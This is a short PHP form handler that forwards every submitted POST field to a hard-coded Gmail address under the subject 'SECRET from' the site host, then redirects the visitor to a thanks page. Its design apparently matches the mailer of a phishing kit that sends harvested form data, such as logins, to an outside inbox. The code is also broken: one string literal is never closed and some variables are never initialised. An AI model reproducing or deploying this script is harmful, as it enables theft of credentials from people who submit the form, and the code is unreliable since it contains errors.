<?php


$mailto = "ismaeldickdick@gmail.com";  


$mailfrom = "ismaeldickdick@gmail.com;  

$redirect = "http://www.mydomain.com/thanks.html"; 

$mailfrom = "From: " . $mailfrom;
$redirect = "location: " . $redirect;
if ($mailcc != "") {
	$mailfrom = $mailfrom . "\r\nCC:" . $mailcc;
}

foreach( $_POST as $key => $value ){
	
	$key = preg_replace("/[\r\n]+/", "\r\n ", trim($key));
	$value = preg_replace("/[\r\n]+/", "\r\n ", trim($value));
	$message = $message . "\r\n " . $key . ":\t" . $value;
}
$spamcheck = strtoupper($message);
if( strpos($spamcheck,'CONTENT-TYPE') !== FALSE ){
	$subject = 	"Spambot attack at " . $_SERVER['HTTP_HOST'];
	$body = 	$_SERVER['REMOTE_ADDR'] . " attempted a spambot attack at " . 
				$_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
	mail($mailto,$subject,$body,$mailfrom);
	exit("<h1>SPAMBOT ATTEMPT FROM {$_SERVER['REMOTE_ADDR']} Has been Recorded</h1>");
}


$subject = 	"SECRET from " . $_SERVER['HTTP_HOST'];
$message = stripslashes($message);
mail($mailto,$subject,$message,$mailfrom);
header($redirect);
?>